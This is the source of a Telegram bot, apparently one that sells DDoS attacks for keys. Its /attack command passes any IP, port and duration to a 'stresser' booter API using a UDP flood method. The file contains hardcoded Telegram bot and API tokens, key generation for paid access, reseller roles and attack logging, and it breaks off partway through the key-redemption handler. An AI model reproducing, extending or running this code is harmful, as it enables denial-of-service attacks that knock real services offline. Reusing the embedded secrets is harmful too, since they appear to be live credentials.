#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙉𝙸𝙓˼ ♪
Owner: 1987818347
"""

import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import re
import sys
import json
import random
import string
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347

BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 5,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    return d
        except:
            pass
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except:
        pass

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= RANDOM ROTATION =============
_sticker_pool = []
_video_pool = []
_pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = data.get("stickers", [])
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
    return _sticker_pool.pop()

def get_random_video():
    global _video_pool
    videos = data.get("videos", [])
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
    return _video_pool.pop()

def get_random_pyf():
    global _pyf_pool
    pyfs = data.get("pyf_videos", [])
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy()
        random.shuffle(_pyf_pool)
    return _pyf_pool.pop()

# ============= HELPERS =============
def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
def is_reseller(uid):
    r = data["resellers"].get(str(uid))
    return r is not None and not r.get('blocked', False)
def is_banned(uid): return str(uid) in data["banned_users"]
def get_setting(k, d=None): return data["settings"].get(k, d)
def set_setting(k, v):
    data["settings"][k] = v
    save_data(data)

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    if is_owner(uid) or is_reseller(uid): return True
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return False
    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
    except: return False

def time_remaining(uid):
    if is_owner(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "❌ ɴᴏ ᴋᴇʏ"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        if rem.total_seconds() <= 0: return "❌ ᴇxᴘɪʀᴇᴅ"
        d = rem.days; h, r = divmod(rem.seconds, 3600); m, _ = divmod(r, 60)
        return f"{d}ᴅ {h}ʜ {m}ᴍ"
    except: return "❌ ᴇʀʀᴏʀ"

user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 5)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        return len(active_attacks) > 0

def ist_now():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        resp = requests.get(req, timeout=10)
        if resp.status_code == 200: return True, resp.text
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
    elif is_reseller(uid) or has_valid_key(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    else:
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    return m

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 𝐆𝐄𝐍 𝐊𝐄𝐘", "👥 𝐔𝐒𝐄𝐑𝐒")
    m.row("📊 𝐒𝐓𝐀𝐓𝐒", "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
    m.row("⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", "❌ 𝐂𝐋𝐎𝐒𝐄")
    return m

# ============= START COMMAND =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    uid = msg.from_user.id
    if is_banned(uid):
        bot.reply_to(msg, "🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ꜰʀᴏᴍ ᴛʜɪꜱ ʙᴏᴛ.")
        return

    name = msg.from_user.first_name or "User"
    username = msg.from_user.username
    cid = msg.chat.id

    check_text = (
        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n"
        "⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠..."
    )

    chosen_pyf_start = get_random_pyf()
    if chosen_pyf_start:
        try:
            check = bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
        except:
            check = bot.send_message(cid, check_text, parse_mode="HTML")
    else:
        check = bot.send_message(cid, check_text, parse_mode="HTML")

    steps = [
        ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
        ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
        ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
        ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
        ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
        ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
    ]

    for bar, pct, status in steps:
        time.sleep(0.7)
        try:
            bot.edit_message_caption(
                chat_id=cid, message_id=check.message_id,
                caption=(
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}\n{status}"
                ),
                parse_mode="HTML"
            )
        except:
            try:
                bot.edit_message_text(
                    chat_id=cid, message_id=check.message_id,
                    text=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n{status}"
                    ),
                    parse_mode="HTML"
                )
            except:
                pass

    time.sleep(0.8)

    is_new = str(uid) not in data["users"]
    if is_new:
        data["users"][str(uid)] = {
            "username": username or name,
            "joined_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "key_expiry": None
        }
        save_data(data)

    has_key = has_valid_key(uid)
    time_left = time_remaining(uid)

    try:
        bot.delete_message(cid, check.message_id)
    except: pass

    sticker_msg = None
    chosen_sticker = get_random_sticker()
    if chosen_sticker:
        try:
            sticker_msg = bot.send_sticker(cid, chosen_sticker)
            time.sleep(5)
        except Exception as e:
            print(f"Sticker Error: {e}")

    header = (
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        f"┊         {BOT_NAME}              ┊\n"
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
    )

    if is_new and not has_key:
        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ, {name}!</b>\n\n"
            "🎉 ᴀᴀᴘᴋᴀ ᴀᴄᴄᴏᴜɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇ ʜᴏ ɢᴀʏᴀ!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>ᴋᴀɪꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴇ?</b>\n\n"
            "1️⃣ <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b> ➤ <code>/redeem YOUR-KEY</code>\n"
            "2️⃣ <b>ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ</b> ➤ <code>/attack IP PORT TIME</code>\n"
            "3️⃣ <b>ᴄʜᴇᴄᴋ ᴘʀᴏꜰɪʟᴇ</b> ➤ <code>/profile</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <b>ʙɪɴᴀ ᴋᴇʏ ᴋᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ʟᴀɢᴇɢᴀ!</b>\n"
            "🔑 ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
        )
    elif has_key:
        u = data["users"].get(str(uid), {})
        total_attacks = u.get("total_attacks", 0)
        role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {name}!</b>\n\n"
            "✅ <b>ᴋᴇʏ ᴠᴇʀɪꜰɪᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>ʀᴏʟᴇ:</b> {role}\n"
            f"🆔 <b>ɪᴅ:</b> <code>{uid}</code>\n"
            f"⏰ <b>ᴛɪᴍᴇ ʟᴇꜰᴛ:</b> <b>{time_left}</b>\n"
            f"🎯 <b>ᴛᴏᴛᴀʟ ᴀᴛᴛᴀᴄᴋꜱ:</b> {total_attacks}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔥 <b>ʀᴇᴀᴅʏ ᴛᴏ ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ?</b>"
        )
    else:
        text = header + (
            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {name}!</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n"
            "ʏᴀ ᴀʙʜɪ ᴛᴀᴋ ʀᴇᴅᴇᴇᴍ ɴᴀʜɪ ᴋɪ!\n\n"
            "📌 <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
            "➤ <code>/redeem YOUR-KEY</code>\n\n"
            "🔑 ɴᴀʏᴀ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
        )

    bot.send_message(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")

    if sticker_msg:
        def delete_sticker():
            time.sleep(1)
            try:
                bot.delete_message(cid, sticker_msg.message_id)
            except:
                pass
        threading.Thread(target=delete_sticker, daemon=True).start()

# ============= ATTACK =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    cid = msg.chat.id

    if get_setting('maintenance_mode', False) and not is_owner(uid):
        bot.reply_to(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

    if not is_owner(uid) and not has_valid_key(uid):
        bot.reply_to(msg, "⚠️ <b>ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ!</b> /redeem ꜰɪʀꜱᴛ.", parse_mode="HTML"); return

    parts = msg.text.split()[1:]
    if len(parts) != 3:
        bot.reply_to(msg, "❌ <b>ᴜꜱᴀɢᴇ:</b> <code>/attack IP PORT TIME</code>", parse_mode="HTML"); return

    ip, ps, ds = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɪᴘ!</b>", parse_mode="HTML"); return

    try:
        port = int(ps); dur = int(ds)
        if not (1 <= port <= 65535): bot.reply_to(msg, "❌ ᴘᴏʀᴛ 1-65535!"); return
        if dur < 1: bot.reply_to(msg, "❌ ᴍɪɴ 1ꜱ!"); return
        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
            bot.reply_to(msg, f"❌ ᴍᴀx {get_setting('max_attack_time', 300)}ꜱ!"); return
    except:
        bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ/ᴛɪᴍᴇ!"); return

    cd = get_cd_remaining(uid)
    if cd > 0 and not is_owner(uid):
        bot.reply_to(msg, f"⏸️ ᴄᴏᴏʟᴅᴏᴡɴ: {cd}ꜱ"); return

    if is_attack_running():
        bot.reply_to(msg, "❌ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!"); return

    set_cd(uid)
    name = msg.from_user.username or f"User_{uid}"

    ok, r = api_attack(ip, port, dur)
    if not ok:
        bot.reply_to(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{r[:300]}</code>", parse_mode="HTML"); return

    attack_caption = (
        f"💀 <b>ᴀᴛᴛᴀᴄᴋ ʟᴀᴜɴᴄʜᴇᴅ</b> 💀\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 ᴜꜱᴇʀ: <b>@{name}</b>\n"
        f"🎯 ᴛᴀʀɢᴇᴛ: <code>{ip}:{port}</code>\n"
        f"⏱️ ᴅᴜʀᴀᴛɪᴏɴ: <b>{dur}ꜱ</b>\n"
        f"🚀 ᴍᴇᴛʜᴏᴅ: <b>{get_setting('api_method', 'UDP-BIG')}</b>\n"
        f"📅 ꜱᴛᴀʀᴛᴇᴅ: <b>{ist_now()} IST</b>"
    )

    chosen_video = get_random_video()
    if chosen_video:
        try:
            bot.send_video(cid, chosen_video, caption=attack_caption, parse_mode="HTML")
        except:
            bot.reply_to(msg, attack_caption, parse_mode="HTML")
    else:
        bot.reply_to(msg, attack_caption, parse_mode="HTML")

    data["attack_logs"].append({
        'user_id': uid, 'username': name, 'target': ip, 'port': port,
        'duration': dur, 'timestamp': datetime.now().isoformat()
    })
    save_data(data)

    aid = f"{uid}_{time.time()}"
    with attack_lock:
        active_attacks[aid] = {
            'target': ip, 'port': port, 'duration': dur,
            'user_id': uid, 'username': name,
            'end_time': datetime.now() + timedelta(seconds=dur)
        }

    def done():
        time.sleep(dur)
        with attack_lock: active_attacks.pop(aid, None)
        complete_caption = f"✅ <b>ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ</b>\n🎯 {ip}:{port} | {dur}ꜱ"
        chosen_video_done = get_random_video()
        if chosen_video_done:
            try:
                bot.send_video(cid, chosen_video_done, caption=complete_caption, parse_mode="HTML")
            except:
                try: bot.send_message(cid, complete_caption, parse_mode="HTML")
                except: pass
        else:
            try: bot.send_message(cid, complete_caption, parse_mode="HTML")
            except: pass

    threading.Thread(target=done, daemon=True).start()
    
# ============= LIVE STATUS (AUTO-UPDATE 3 SEC) =============
@bot.message_handler(commands=['status'])
def cmd_status(msg):
    uid = msg.from_user.id
    cid = msg.chat.id

    status_msg = bot.send_message(cid, "📊 <b>ʟᴏᴀᴅɪɴɢ ꜱᴛᴀᴛᴜꜱ...</b>", parse_mode="HTML")

    def get_attack_box():
        with attack_lock:
            now = datetime.now()
            running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]

        if not running:
            return None

        atk = running[0][1]
        rem = int((atk['end_time'] - now).total_seconds())
        dur = atk.get('duration', 60)
        pct = int(((dur - rem) / dur) * 100) if dur > 0 else 0
        filled = int(pct / 10)
        bar = "▰" * filled + "▱" * (10 - filled)

        if pct < 20:
            status_txt = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
        elif pct < 50:
            status_txt = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
        elif pct < 80:
            status_txt = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
        elif pct < 100:
            status_txt = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
        else:
            status_txt = "✅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ"

        return (
            "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
            "▌   🎯 𝗟𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦   ▐\n"
            "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
            f"{bar} {pct}%\n"
            f"{status_txt}\n\n"
            "╭━━━━━━━━━━━━━━━━━━━━╮\n"
            "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
            "╰━━━━━━━━━━━━━━━━━━━━╯\n"
            f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{atk['target']}:{atk['port']}</code>\n"
            f"┣ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem}ꜱ</b>\n"
            f"┣ 🕐 ᴛᴏᴛᴀʟ ➪ <b>{dur}ꜱ</b>\n"
            f"┗ 👤 ᴜꜱᴇʀ ➪ <b>@{atk.get('username', 'Unknown')}</b>\n\n"
        )

    def build_status():
        with attack_lock:
            now = datetime.now()
            running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]

        uptime = str(datetime.now() - BOT_START_TIME).split('.')[0]
        total_users = len(data['users'])
        total_attacks = len(data['attack_logs'])
        total_keys = len(data['keys'])
        user_attacks = data['users'].get(str(uid), {}).get('total_attacks', 0)
        time_left = time_remaining(uid)
        role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

        txt = ""
        if running:
            box = get_attack_box()
            if box:
                txt += box

        txt += (
            "╔══════════════════════════╗\n"
            "║   📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗨𝗦 📊   ║\n"
            "╚══════════════════════════╝\n\n"
            "╭━━━━━━━━━━━━━━━━━━━━╮\n"
            "┃  🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢\n"
            "╰━━━━━━━━━━━━━━━━━━━━╯\n"
            f"┣ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🟢 <b>ᴏɴʟɪɴᴇ</b>\n"
            f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime}</b>\n"
            f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
            f"┗ 🌍 ɢᴇᴏ ➪ <code>{get_setting('api_geolocation', 'ALL')}</code>\n\n"
            "╭━━━━━━━━━━━━━━━━━━━━╮\n"
            "┃  📈 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
            "╰━━━━━━━━━━━━━━━━━━━━╯\n"
            f"┣ 👥 ᴜꜱᴇʀꜱ ➪ <b>{total_users}</b>\n"
            f"┣ 🔑 ᴋᴇʏꜱ ➪ <b>{total_keys}</b>\n"
            f"┣ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_attacks}</b>\n"
            f"┗ ⚡ ᴀᴄᴛɪᴠᴇ ➪ <b>{len(running)}</b>\n\n"
            "╭━━━━━━━━━━━━━━━━━━━━╮\n"
            "┃  👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢\n"
            "╰━━━━━━━━━━━━━━━━━━━━╯\n"
            f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
            f"┣ 🎯 ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{user_attacks}</b>\n"
            f"┗ ⏰ ᴛɪᴍᴇ ➪ <b>{time_left}</b>\n\n"
            "╔══════════════════════════╗\n"
            "║   🔥 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞 🔥   ║\n"
            "╚══════════════════════════╝"
        )
        return txt

    try:
        bot.edit_message_text(cid, status_msg.message_id, build_status(), parse_mode="HTML")
    except Exception as e:
        print(f"Status Error: {e}")

    # Auto-update thread — 3 sec
    def auto_update():
        for _ in range(200):  # 200 * 3 = 600 seconds max (10 min)
            time.sleep(3)
            try:
                bot.edit_message_text(cid, status_msg.message_id, build_status(), parse_mode="HTML")
            except:
                break
            with attack_lock:
                if not active_attacks:
                    # Keep updating few more times, then stop
                    pass

    threading.Thread(target=auto_update, daemon=True).start()


# ============= PROFILE =============
@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    uid = msg.from_user.id
    u = data["users"].get(str(uid), {})
    role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

    txt = (
        "╔══════════════════════════╗\n"
        "║   👤 𝗬𝗢𝗨𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 👤   ║\n"
        "╚══════════════════════════╝\n\n"
        "╭━━━━━━━━━━━━━━━━━━━━╮\n"
        "┃  📋 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
        "╰━━━━━━━━━━━━━━━━━━━━╯\n"
        f"┣ 🆔 ɪᴅ ➪ <code>{uid}</code>\n"
        f"┣ 📛 ɴᴀᴍᴇ ➪ <b>{msg.from_user.first_name}</b>\n"
        f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
        f"┣ ⏰ ᴛɪᴍᴇ ➪ <b>{time_remaining(uid)}</b>\n"
        f"┗ 🎯 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{u.get('total_attacks', 0)}</b>\n\n"
        "╔══════════════════════════╗\n"
        "║   ⚡ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗘 ⚡   ║\n"
        "╚══════════════════════════╝"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")


# ============= KEY MANAGEMENT (CUSTOM NAME) =============
@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg,
            "⚠️ <b>ᴜꜱᴀɢᴇ:</b>\n"
            "<code>/genkey DAYS [AMOUNT]</code>\n"
            "<code>/genkey DAYS AMOUNT CUSTOM-NAME</code>\n\n"
            "📝 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
            "<code>/genkey 30 5 PREMIUM</code>",
            parse_mode="HTML")
        return

    try:
        days = int(p[1])
        amt = int(p[2]) if len(p) > 2 else 1
        custom_name = p[3].upper() if len(p) > 3 else None
    except:
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ!</b>", parse_mode="HTML"); return

    keys = []
    for _ in range(amt):
        if custom_name:
            # CUSTOM NAME format: CUSTOMNAME-XXXX-XXXX-XXXX
            random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            formatted = f"{custom_name}-{random_part[:4]}-{random_part[4:8]}-{random_part[8:12]}"
        else:
            raw = gen_key(16)
            formatted = fmt_key(raw)

        data["keys"][formatted] = {
            "days": days,
            "created_at": datetime.now().isoformat(),
            "used": False,
            "used_by": None
        }
        keys.append(formatted)
    save_data(data)

    txt = f"✅ <b>ɢᴇɴᴇʀᴀᴛᴇᴅ {amt} ᴋᴇʏꜱ</b>\n━━━━━━━━━━━━━\n"
    for k in keys:
        txt += f"<code>{k}</code>\n"
    txt += f"━━━━━━━━━━━━━\n⏰ ᴅᴜʀᴀᴛɪᴏɴ: <b>{days} ᴅᴀʏꜱ</b>"
    bot.reply_to(msg, txt, parse_mode="HTML")


@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ <code>/redeem KEY</code>", parse_mode="HTML"); return
    key = p[1].strip().upper()
    if key not in data["keys"]:
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴋᴇʏ!</b>", parse_mode="HTML"); return
    kinfo = data["keys"][key]
